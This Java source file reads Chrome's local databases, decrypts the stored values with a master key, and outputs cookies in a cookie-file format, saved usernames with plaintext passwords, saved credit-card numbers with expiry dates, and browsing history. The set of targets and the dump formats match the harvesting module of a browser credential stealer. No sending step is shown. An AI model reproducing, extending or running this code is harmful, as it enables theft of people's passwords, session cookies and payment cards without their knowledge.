import java.sql.ResultSet;
import java.util.Base64;

public class SqliteReader {

    public interface ResultProcessor {

        String processRow(ResultSet rs) throws Exception;
    }

    public static class CookieReader implements ResultProcessor {
        private final byte[] masterKey;

        public CookieReader(byte[] masterKey) {
            this.masterKey = masterKey;
        }

        @Override
        public String processRow(ResultSet rs) throws Exception {
            String host = rs.getString("host_key");
            String name = rs.getString("name");
            byte[] encryptedValue = rs.getBytes("encrypted_value");
            String path = rs.getString("path");
            long expiresUtc = rs.getLong("expires_utc");
            boolean isSecure = rs.getBoolean("is_secure");

            String value = ChromeDecryptor.decryptCredential(encryptedValue, masterKey);
            if (value == null) value = "";

            return String.format("%s\tFALSE\t%s\t%s\t%d\t%s\t%s",
                host, path, isSecure ? "TRUE" : "FALSE",
                expiresUtc, name, value);
        }
    }

    public static class LoginDataReader implements ResultProcessor {
        private final byte[] masterKey;

        public LoginDataReader(byte[] masterKey) {
            this.masterKey = masterKey;
        }

        @Override
        public String processRow(ResultSet rs) throws Exception {
            String url = rs.getString("origin_url");
            String username = rs.getString("username_value");
            byte[] encryptedPassword = rs.getBytes("password_value");

            String password = ChromeDecryptor.decryptCredential(encryptedPassword, masterKey);
            if (password == null) password = "[DECRYPTION FAILED]";

            return String.format("URL: %s\nUsername: %s\nPassword: %s\n---",
                url, username, password);
        }
    }

    public static class CreditCardReader implements ResultProcessor {
        private final byte[] masterKey;

        public CreditCardReader(byte[] masterKey) {
            this.masterKey = masterKey;
        }

        @Override
        public String processRow(ResultSet rs) throws Exception {
            String name = rs.getString("name_on_card");
            byte[] encryptedNumber = rs.getBytes("card_number_encrypted");
            int expMonth = rs.getInt("expiration_month");
            int expYear = rs.getInt("expiration_year");

            String cardNumber = ChromeDecryptor.decryptCredential(encryptedNumber, masterKey);
            if (cardNumber == null) cardNumber = "[DECRYPTION FAILED]";

            return String.format("Name: %s\nNumber: %s\nExpiry: %02d/%d\n---",
                name, cardNumber, expMonth, expYear);
        }
    }

    public static class HistoryReader implements ResultProcessor {
        @Override
        public String processRow(ResultSet rs) throws Exception {
            String url = rs.getString("url");
            String title = rs.getString("title");
            int visitCount = rs.getInt("visit_count");

            return String.format("[%d visits] %s - %s", visitCount, title, url);
        }
    }
}